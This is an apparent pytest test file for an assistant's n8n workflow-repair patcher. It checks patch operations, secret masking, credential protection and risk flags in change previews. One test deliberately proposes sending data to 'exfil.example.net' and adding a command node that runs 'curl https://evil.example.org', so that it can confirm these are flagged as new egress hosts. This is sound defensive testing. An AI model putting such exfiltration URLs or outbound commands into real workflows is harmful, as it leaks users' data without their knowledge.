import json
import uuid
from copy import deepcopy
from pathlib import Path

import pytest

from backend.modules.assistant import repair_contract as contract
from backend.modules.assistant.repair_context import MASK, TRUNCATED, WRITABLE_KEYS, mask_workflow
from backend.modules.assistant.repair_diff import PatchError, apply_operations, preview

FIXTURE = json.loads((Path(__file__).parent / 'fixtures' / 'repair_proposal_v1.json').read_text(encoding='utf-8'))
SECRET = 'sk-fixture-secret'


def workflow():
    return {
        'id': 'wf-orders', 'name': 'Order synchronization', 'active': False, 'versionId': '7c1e2d3f-4a5b-4c6d-8e9f-0a1b2c3d4e5f',
        'pinData': {'Webhook': [{'json': {'pinned': True}}]}, 'staticData': {'last': 1},
        'nodes': [
            {'id': 'n1', 'name': 'Webhook', 'type': 'n8n-nodes-base.webhook', 'typeVersion': 2, 'position': [0, 0],
             'webhookId': 'hook-1', 'parameters': {'path': 'orders', 'httpMethod': 'POST'}},
            {'id': 'n2', 'name': 'HTTP Request', 'type': 'n8n-nodes-base.httpRequest', 'typeVersion': 4.2, 'position': [200, 0],
             'parameters': {'url': 'https://api.example.com/v1/orders', 'options': {},
                            'headerParameters': {'parameters': [{'name': 'Authorization', 'value': f'Bearer {SECRET}'}]}},
             'credentials': {'httpHeaderAuth': {'id': 'cred-private-id', 'name': 'Orders API'}}},
            {'id': 'n3', 'name': 'Code', 'type': 'n8n-nodes-base.code', 'typeVersion': 2, 'position': [400, 0],
             'parameters': {'jsCode': 'return item;'}},
            {'id': 'n4', 'name': 'Python', 'type': 'n8n-nodes-base.code', 'typeVersion': 2, 'position': [400, 200],
             'parameters': {'language': 'python', 'pythonCode': 'return items'}},
        ],
        'connections': {'Webhook': {'main': [[{'node': 'HTTP Request', 'type': 'main', 'index': 0}]]},
                        'HTTP Request': {'main': [[{'node': 'Code', 'type': 'main', 'index': 0}]]}},
        'settings': {'executionOrder': 'v1'},
    }


def fixture_workflow():
    source = workflow()
    source['nodes'].pop()
    source['nodes'][1]['parameters'].pop('options')
    source['connections'].pop('HTTP Request')
    return source


def apply(document, *operations, **kwargs):
    return apply_operations(document, list(operations), **kwargs)


def spec(name, kind='n8n-nodes-base.noOp', **extra):
    return {'op': 'add_node', 'node': {'name': name, 'type': kind, 'type_version': 1, 'position': [0, 400], **extra}}


def set_url(document, url):
    return apply(document, {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'url', 'value': url})


def test_self_call_to_own_webhook_is_flagged_and_reported():
    from backend.modules.assistant.repair_diff import introduced_self_calls
    before = workflow()
    desired = set_url(before, 'http://127.0.0.1:5678/webhook/orders')
    view = preview(before, desired, kind='workflow_patch')
    contract.Preview.model_validate(view)
    loops = [risk for risk in view['risks'] if risk['code'] == 'self_webhook_call']
    assert loops == [{'code': 'self_webhook_call', 'node': 'HTTP Request', 'detail': '/webhook/orders'}]
    assert introduced_self_calls(before, desired) == loops


@pytest.mark.parametrize('url', ['={{ $env.N8N_URL }}/webhook-test/orders', 'https://n8n.example.com/webhook/orders/extra',
                                 'http://n8n:5678/webhook/ORDERS', 'http://localhost:5678/webhook/hook-1'])
def test_self_call_detection_is_host_independent(url):
    from backend.modules.assistant.repair_diff import introduced_self_calls
    assert [risk['node'] for risk in introduced_self_calls(workflow(), set_url(workflow(), url))] == ['HTTP Request']


@pytest.mark.parametrize('url', ['http://127.0.0.1:5678/webhook/order-service', 'https://api.example.com/v2/orders',
                                 'http://n8n/webhook/ordersx'])
def test_other_routes_are_not_self_calls(url):
    from backend.modules.assistant.repair_diff import introduced_self_calls
    assert introduced_self_calls(workflow(), set_url(workflow(), url)) == []


def test_existing_self_calls_and_disabled_triggers_are_not_new_findings():
    from backend.modules.assistant.repair_diff import introduced_self_calls
    looping = set_url(workflow(), 'http://localhost/webhook/orders')
    later = apply(looping, {'op': 'set_code', 'node': 'Code', 'code': 'return items;'})
    assert introduced_self_calls(looping, later) == []
    quiet = apply(workflow(), {'op': 'set_disabled', 'node': 'Webhook', 'disabled': True})
    assert introduced_self_calls(quiet, set_url(quiet, 'http://localhost/webhook/orders')) == []


def test_set_and_remove_parameter_walk_paths_on_a_detached_copy():
    source = workflow()
    result = apply(source,
                   {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'url', 'value': 'https://api.example.com/v2/orders'},
                   {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'options.retry.maxTries', 'value': 3},
                   {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'headerParameters.parameters[0].name', 'value': 'X-Trace'},
                   {'op': 'remove_parameter', 'node': 'Webhook', 'path': 'httpMethod'})
    assert source == workflow()
    assert tuple(result) == WRITABLE_KEYS
    parameters = result['nodes'][1]['parameters']
    assert parameters['url'] == 'https://api.example.com/v2/orders' and parameters['options'] == {'retry': {'maxTries': 3}}
    assert parameters['headerParameters']['parameters'][0]['name'] == 'X-Trace'
    assert result['nodes'][0]['parameters'] == {'path': 'orders'}
    result['nodes'][2]['parameters']['jsCode'] = 'mutated'
    assert source == workflow()
    removed = apply(source, {'op': 'remove_parameter', 'node': 'HTTP Request', 'path': 'headerParameters.parameters[0]'})
    assert removed['nodes'][1]['parameters']['headerParameters'] == {'parameters': []}


@pytest.mark.parametrize('operations', [
    [{'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'headerParameters.parameters[5].name', 'value': 'x'}],
    [{'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'url.deeper', 'value': 'x'}],
    [{'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'missing[0]', 'value': 'x'}],
    [{'op': 'remove_parameter', 'node': 'HTTP Request', 'path': 'options.missing'}],
    [{'op': 'remove_parameter', 'node': 'Missing', 'path': 'url'}],
    [{'op': 'set_code', 'node': 'HTTP Request', 'code': 'return 1;'}],
    [spec('Code')],
    [{'op': 'connect', 'from_node': 'Code', 'to_node': 'Missing'}],
    [{'op': 'connect', 'from_node': 'Webhook', 'to_node': 'HTTP Request'}],
    [{'op': 'disconnect', 'from_node': 'Code', 'to_node': 'Webhook'}],
    [{'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'headerParameters.parameters[0].value', 'value': MASK}],
    [{'op': 'set_setting', 'key': 'timezone', 'value': f'{MASK} zone'}],
    [{'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'url', 'value': f'https://api.example.com{TRUNCATED}'}],
    [{'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'credentials.httpHeaderAuth.id', 'value': 'other'}],
    [{'op': 'set_setting', 'key': 'binaryMode', 'value': 'x'}],
    [{'op': 'rename_node', 'node': 'Code'}],
    [],
])
def test_invalid_operations_raise_safe_patch_errors(operations):
    source = workflow()
    with pytest.raises(PatchError) as caught:
        apply_operations(source, operations)
    assert caught.value.code == 'invalid_patch' and caught.value.message == str(caught.value)
    assert SECRET not in caught.value.message and source == workflow()


def test_set_code_uses_codelab_language_detection_and_refuses_truncated_code():
    result = apply(workflow(), {'op': 'set_code', 'node': 'Code', 'code': 'return items;'},
                   {'op': 'set_code', 'node': 'Python', 'code': 'return [item for item in items]'})
    assert result['nodes'][2]['parameters'] == {'jsCode': 'return items;'}
    assert result['nodes'][3]['parameters'] == {'language': 'python', 'pythonCode': 'return [item for item in items]'}
    for operation in ({'op': 'set_code', 'node': 'Code', 'code': 'return 1;'},
                      {'op': 'set_parameter', 'node': 'Code', 'path': 'jsCode', 'value': 'return 1;'}):
        with pytest.raises(PatchError, match='truncated'):
            apply(workflow(), operation, truncated_paths=frozenset({'Code.parameters.jsCode'}))
    large = workflow()
    large['nodes'][2]['parameters']['jsCode'] = 'return 1;\n' * 2000
    truncated = set(mask_workflow(large, max_bytes=10**6)['truncated_paths'])
    with pytest.raises(PatchError, match='truncated'):
        apply(large, {'op': 'set_code', 'node': 'Code', 'code': 'return 2;'}, truncated_paths=truncated)


def test_add_node_assigns_fresh_ids_webhook_ids_and_no_credentials():
    hook = spec('Hook', 'n8n-nodes-base.webhook', parameters={'path': 'new'})
    hook['node']['type_version'] = 2
    result = apply(workflow(), hook, spec('Log', disabled=True))
    added, log = result['nodes'][4], result['nodes'][5]
    assert {key: added[key] for key in ('name', 'type', 'typeVersion', 'position', 'parameters')} == {
        'name': 'Hook', 'type': 'n8n-nodes-base.webhook', 'typeVersion': 2, 'position': [0, 400], 'parameters': {'path': 'new'}}
    assert uuid.UUID(added['id']) and uuid.UUID(added['webhookId']) and 'credentials' not in added
    assert log['disabled'] is True and log['parameters'] == {} and 'webhookId' not in log
    again = apply(workflow(), hook)['nodes'][4]
    assert again['id'] != added['id'] and again['webhookId'] != added['webhookId']


def test_remove_node_drops_every_connection_to_and_from_it():
    result = apply(workflow(), {'op': 'remove_node', 'node': 'HTTP Request'})
    assert [node['name'] for node in result['nodes']] == ['Webhook', 'Code', 'Python']
    assert result['connections'] == {}
    source = workflow()
    source['connections']['Webhook']['main'][0].append({'node': 'Python', 'type': 'main', 'index': 0})
    source['connections']['Python'] = {'main': [[], [{'node': 'HTTP Request', 'type': 'main', 'index': 0}]]}
    result = apply(source, {'op': 'remove_node', 'node': 'HTTP Request'})
    assert result['connections'] == {'Webhook': {'main': [[{'node': 'Python', 'type': 'main', 'index': 0}]]}}


def test_disable_connect_disconnect_and_settings():
    result = apply(workflow(), {'op': 'set_disabled', 'node': 'Code', 'disabled': True},
                   {'op': 'connect', 'from_node': 'Code', 'to_node': 'Python', 'output_index': 1},
                   {'op': 'connect', 'from_node': 'Python', 'to_node': 'Code', 'connection_type': 'ai_tool'},
                   {'op': 'disconnect', 'from_node': 'HTTP Request', 'to_node': 'Code'},
                   {'op': 'set_setting', 'key': 'timezone', 'value': 'Europe/Berlin'},
                   {'op': 'set_setting', 'key': 'executionOrder', 'value': None})
    assert result['nodes'][2]['disabled'] is True
    assert result['connections'] == {
        'Webhook': {'main': [[{'node': 'HTTP Request', 'type': 'main', 'index': 0}]]},
        'Code': {'main': [[], [{'node': 'Python', 'type': 'main', 'index': 0}]]},
        'Python': {'ai_tool': [[{'node': 'Code', 'type': 'ai_tool', 'index': 0}]]}}
    assert result['settings'] == {'timezone': 'Europe/Berlin'}
    assert 'disabled' not in apply(result, {'op': 'set_disabled', 'node': 'Code', 'disabled': False})['nodes'][2]


@pytest.mark.parametrize('operations', [
    [{'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'url', 'value': 'https://api.example.com/v1/orders'}],
    [{'op': 'set_disabled', 'node': 'Code', 'disabled': False}],
    [{'op': 'set_setting', 'key': 'timezone', 'value': None}],
    [{'op': 'connect', 'from_node': 'Code', 'to_node': 'Python'}, {'op': 'disconnect', 'from_node': 'Code', 'to_node': 'Python'}],
])
def test_no_op_patches_are_rejected(operations):
    with pytest.raises(PatchError, match='do not change'):
        apply_operations(workflow(), operations)


def test_credentials_stay_untouched_and_cannot_be_replaced():
    result = apply(workflow(), {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'url', 'value': 'https://api.example.com/v2'})
    assert result['nodes'][1]['credentials'] == workflow()['nodes'][1]['credentials']
    with pytest.raises(PatchError, match='Credentials'):
        apply(workflow(), {'op': 'remove_node', 'node': 'HTTP Request'}, spec('HTTP Request', 'n8n-nodes-base.httpRequest'))


def test_contract_model_operations_apply_and_size_limit_holds():
    arguments = contract.PatchArguments.model_validate(FIXTURE['patch']['pending_action']['arguments'])
    desired = apply_operations(fixture_workflow(), arguments.operations)
    assert desired['nodes'][1]['parameters']['url'] == 'https://api.example.com/v2/orders'
    assert desired['nodes'][2]['parameters']['jsCode'] == 'return items;'
    large = [{'op': 'set_parameter', 'node': 'HTTP Request', 'path': f'notes{index}', 'value': 'x' * 30000} for index in range(40)]
    with pytest.raises(PatchError, match='1 MiB'):
        apply_operations(workflow(), large)


def test_preview_matches_fixture_patch_and_restore():
    before = fixture_workflow()
    pending = FIXTURE['patch']['pending_action']
    desired = apply_operations(before, pending['arguments']['operations'])
    contract.Preview.model_validate(pending['preview'])  # Persisted v1 remains readable.
    expected = {**pending['preview'], 'contract': contract.CONTRACT_VERSION}
    result = preview(before, desired, kind='workflow_patch', model_summary=pending['arguments']['summary'],
                     preconditions=expected['preconditions'], workflow_name='Order synchronization')
    contract.Preview.model_validate(result)
    assert {**result, 'summary_text': None} == {**expected, 'summary_text': None}
    assert result['summary_text'] == 'Change 2 nodes in workflow “Order synchronization”: HTTP Request, Code.'
    contract.Preview.model_validate(FIXTURE['restore']['pending_action']['preview'])
    restore = {**FIXTURE['restore']['pending_action']['preview'], 'contract': contract.CONTRACT_VERSION}
    assert preview(desired, before, kind='workflow_restore', summary_text=restore['summary_text']) == restore
    assert before == fixture_workflow()


def test_preview_masks_values_and_flags_risks_without_model_names_in_summary():
    before = workflow()
    desired = apply(before,
                    {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'headerParameters.parameters[0].value', 'value': 'Bearer sk-new-token-value'},
                    {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'url', 'value': 'https://exfil.example.net/collect'},
                    spec('Run', 'n8n-nodes-base.executeCommand', parameters={'command': 'curl https://evil.example.org'}),
                    spec('Script', 'n8n-nodes-base.code', parameters={'jsCode': 'return [];'}),
                    {'op': 'remove_node', 'node': 'Python'},
                    {'op': 'set_parameter', 'node': 'Webhook', 'path': 'path', 'value': 'orders-v2'},
                    {'op': 'set_setting', 'key': 'errorWorkflow', 'value': 'wf-errors'})
    result = preview(before, desired, kind='workflow_patch', model_summary='Model text')
    contract.Preview.model_validate(result)
    text = json.dumps(result, ensure_ascii=False)
    assert SECRET not in text and 'sk-new-token-value' not in text and 'cred-private-id' not in text
    assert [(change['kind'], change.get('node'), change.get('path')) for change in result['changes']] == [
        ('node_removed', 'Python', None), ('parameter', 'Webhook', 'parameters.path'), ('parameter', 'HTTP Request', 'parameters.url'),
        ('parameter', 'HTTP Request', 'parameters.headerParameters.parameters[0].value'), ('node_added', 'Run', None),
        ('parameter', 'Run', 'parameters.command'), ('node_added', 'Script', None), ('code', 'Script', 'parameters.jsCode'),
        ('setting', None, 'settings.errorWorkflow')]
    header = result['changes'][3]
    assert (header['before'], header['after'], header['masked']) == (MASK, MASK, True)
    assert result['changes'][2]['masked'] is False and result['changes'][7]['lines'] == [{'op': 'add', 'text': 'return [];'}]
    assert result['risks'] == [
        {'code': 'new_egress_host', 'node': 'HTTP Request', 'detail': 'exfil.example.net'},
        {'code': 'new_egress_host', 'node': 'Run', 'detail': 'evil.example.org'},
        {'code': 'code_node_added', 'node': 'Script', 'detail': 'n8n-nodes-base.code'},
        {'code': 'command_node_added', 'node': 'Run', 'detail': 'n8n-nodes-base.executeCommand'},
        {'code': 'error_workflow_changed', 'node': None, 'detail': 'wf-errors'},
        {'code': 'trigger_changed', 'node': 'Webhook', 'detail': 'changed'},
        {'code': 'node_removed', 'node': 'Python', 'detail': 'n8n-nodes-base.code'}]
    assert result['summary_text'] == ('Change 2 nodes, add 2 nodes, remove 1 node and update settings in workflow '
                                      '“Order synchronization”: Webhook, HTTP Request, Python.')
    assert result['model_summary'] == 'Model text' and before == workflow()


def test_preview_code_line_diffs_value_caps_and_change_cap():
    before = workflow()
    before['nodes'][2]['parameters']['jsCode'] = 'const a = 1;\nconst token = "abc123secret";\nreturn item;\n// end'
    desired = apply(before, {'op': 'set_code', 'node': 'Code', 'code': 'const a = 1;\nconst token = "abc123secret";\nreturn items;\n// end'})
    code = preview(before, desired, kind='workflow_patch')['changes'][0]
    assert code['lines'] == [{'op': 'keep', 'text': 'const a = 1;'}, {'op': 'keep', 'text': f'const token = "{MASK}";'},
                             {'op': 'remove', 'text': 'return item;'}, {'op': 'add', 'text': 'return items;'},
                             {'op': 'keep', 'text': '// end'}]
    assert code['truncated'] is False and code['language'] == 'javaScript'
    before['nodes'][2]['parameters']['jsCode'] = '\n'.join(f'line {i}' for i in range(600))
    desired = apply(before, {'op': 'set_code', 'node': 'Code', 'code': '\n'.join('changed 300' if i == 300 else f'line {i}' for i in range(600))})
    code = preview(before, desired, kind='workflow_patch')['changes'][0]
    assert code['truncated'] is True
    assert code['lines'] == ([{'op': 'keep', 'text': f'line {i}'} for i in (297, 298, 299)] + [
        {'op': 'remove', 'text': 'line 300'}, {'op': 'add', 'text': 'changed 300'}] + [{'op': 'keep', 'text': f'line {i}'} for i in (301, 302, 303)])
    desired = apply(workflow(), {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'body', 'value': 'word ' * 1000},
                    {'op': 'set_parameter', 'node': 'HTTP Request', 'path': 'list', 'value': ['word ' * 100] * 10})
    body, listed = preview(workflow(), desired, kind='workflow_patch')['changes']
    assert body['truncated'] and body['after'].endswith(TRUNCATED) and len(body['after'].encode()) <= 2048 and body['before'] is None
    assert listed['truncated'] and isinstance(listed['after'], str) and len(listed['after'].encode()) <= 2048
    many = apply(workflow(), *[{'op': 'set_parameter', 'node': 'Webhook', 'path': f'p{i}', 'value': i} for i in range(50)])
    many = apply(many, *[{'op': 'set_parameter', 'node': 'Code', 'path': f'p{i}', 'value': i} for i in range(20)])
    capped = preview(workflow(), apply(many, *[{'op': 'set_parameter', 'node': 'Python', 'path': f'p{i}', 'value': i} for i in range(50)]),
                     kind='workflow_patch')
    contract.Preview.model_validate(capped)
    assert len(capped['changes']) == 100 and capped['changes_omitted'] == 20


def test_restore_preview_shows_connections_rename_credentials_and_trigger_changes():
    before = workflow()
    desired = deepcopy(before)
    desired['name'] = 'Old name'
    desired['nodes'][0]['typeVersion'] = 1
    desired['nodes'][1]['credentials'] = {'httpBasicAuth': {'id': 'old-private-id', 'name': 'Old account'}}
    desired['connections'].pop('HTTP Request')
    desired['connections']['Code'] = {'main': [[{'node': 'Python', 'type': 'main', 'index': 0}]]}
    desired['nodes'][2]['disabled'] = True
    result = preview(before, desired, kind='workflow_restore', workflow_name='Order synchronization')
    contract.Preview.model_validate(result)
    assert result['changes'] == [
        {'kind': 'parameter', 'node': 'Webhook', 'path': 'typeVersion', 'before': 2, 'after': 1, 'masked': False, 'truncated': False},
        {'kind': 'parameter', 'node': 'HTTP Request', 'path': 'credentials', 'before': ['httpHeaderAuth'], 'after': ['httpBasicAuth'],
         'masked': True, 'truncated': False},
        {'kind': 'node_disabled', 'node': 'Code', 'disabled': True},
        {'kind': 'connection_removed', 'from_node': 'HTTP Request', 'to_node': 'Code', 'connection_type': 'main', 'output_index': 0, 'input_index': 0},
        {'kind': 'connection_added', 'from_node': 'Code', 'to_node': 'Python', 'connection_type': 'main', 'output_index': 0, 'input_index': 0},
        {'kind': 'setting', 'path': 'name', 'before': 'Order synchronization', 'after': 'Old name', 'masked': False, 'truncated': False}]
    assert result['risks'] == [{'code': 'trigger_changed', 'node': 'Webhook', 'detail': 'changed'}]
    assert result['summary_text'] == ('Restore workflow “Order synchronization”: change 3 nodes, update connections and rename the workflow '
                                      '(Webhook, HTTP Request, Code).')
    assert result['apply'] == {'label': 'Restore version', 'danger': False, 'typed_confirmation': None}
    assert 'old-private-id' not in json.dumps(result) and 'cred-private-id' not in json.dumps(result)
    with pytest.raises(ValueError):
        preview(before, desired, kind='workflow_create')
